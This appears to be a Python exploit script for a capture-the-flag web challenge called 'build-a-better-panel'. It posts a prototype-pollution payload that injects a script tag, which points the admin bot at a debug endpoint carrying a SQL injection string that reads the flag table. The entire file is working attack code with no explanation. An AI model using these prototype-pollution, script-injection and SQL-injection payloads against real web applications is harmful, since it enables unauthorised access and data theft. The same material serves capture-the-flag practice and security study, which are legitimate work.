#!/usr/bin/env python3

import requests
import urllib.parse
import json

url = "https://build-a-better-panel.dicec.tf"

s = requests.Session()

cookie = "l3ooooo"
res = s.get(f"{url}/create", params={"debugid": cookie})
print("create", res.status_code)


def add(data):
    res = s.post(f"{url}/panel/add", json=data)
    print("panel/add", res.status_code)


def sql_url():
    panelid = "l3ooooo"
    widgetname = "l3o_widget"
    widgetdata = "\"' || (SELECT * FROM flag) || '\""
    widgetdata = urllib.parse.quote(widgetdata)
    return f"{url}/admin/debug/add_widget?panelid={panelid}&widgetname={widgetname}&widgetdata={widgetdata}"


name = "constructor"
data = {
	"prototype": {
		"srcdoc": "<script src=\""+sql_url()+"\"></script>"
	}
}
data = {
    "widgetName": name,
    "widgetData": json.dumps(data),
}

add(data)

print(f"Give admin bot {url}/create?debugid={cookie}")